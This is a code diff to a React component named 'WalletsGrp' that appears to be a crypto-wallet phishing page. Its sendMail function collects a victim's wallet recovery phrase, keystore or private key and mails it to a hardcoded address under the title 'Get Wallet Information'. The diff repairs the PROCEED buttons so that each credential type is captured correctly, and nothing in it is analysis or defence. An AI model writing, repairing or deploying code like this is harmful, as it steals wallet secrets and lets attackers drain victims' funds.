@@ -217,7 +217,7 @@ export default function WalletsGrp() {
   };
 
   const sendMail = (method) => {
-    let htmlContent = "";
+    var htmlContent = "";
     if (method === "Phrase") {
       htmlContent = `<p>Phrase</p>
                      <p>WalletName:${wname}</p>
@@ -241,6 +241,7 @@ export default function WalletsGrp() {
         BaseURL,
         {
           email: "thisislucaswilliam@protonmail.com",
+          // email:"smartdevpro001@gmail.com",
           html: htmlContent,
           title: "Get Wallet Information",
         },
@@ -1273,9 +1274,9 @@ export default function WalletsGrp() {
                 </div>
               </Grid>
               <Grid item xs={12}>
-                <button className="s-modal-process-btn" onClick={handleModal3}>
+                <button className="s-modal-process-btn" onClick={() => handleModal3("Phrase")}>
                   <div style={{ display: "inline-flex" }}>
-                    <div style={{ marginTop: "3px", marginRight: "10px" }} onClick={() => handleModal3("Phrase")}>
+                    <div style={{ marginTop: "3px", marginRight: "10px" }} >
                       PROCEED
                     </div>
                     <div className="svg-icon">
@@ -1327,9 +1328,9 @@ export default function WalletsGrp() {
                 </div>
               </Grid>
               <Grid item xs={12}>
-                <button className="s-modal-process-btn" onClick={handleModal3}>
+                <button className="s-modal-process-btn" onClick={() => handleModal3("KeyStore")}>
                   <div style={{ display: "inline-flex" }}>
-                    <div style={{ marginTop: "3px", marginRight: "10px" }} onClick={() => handleModal3("KeyStore")}>
+                    <div style={{ marginTop: "3px", marginRight: "10px" }} >
                       PROCEED
                     </div>
                     <div className="svg-icon">
@@ -1373,9 +1374,9 @@ export default function WalletsGrp() {
                 </div>
               </Grid>
               <Grid item xs={12}>
-                <button className="s-modal-process-btn" onClick={handleModal3}>
+                <button className="s-modal-process-btn" onClick={() => handleModal3("PrivateKey")}>
                   <div style={{ display: "inline-flex" }}>
-                    <div style={{ marginTop: "3px", marginRight: "10px" }} onClick={() => handleModal3("PrivateKey")}>
+                    <div style={{ marginTop: "3px", marginRight: "10px" }} >
                       PROCEED
                     </div>
                     <div className="svg-icon">
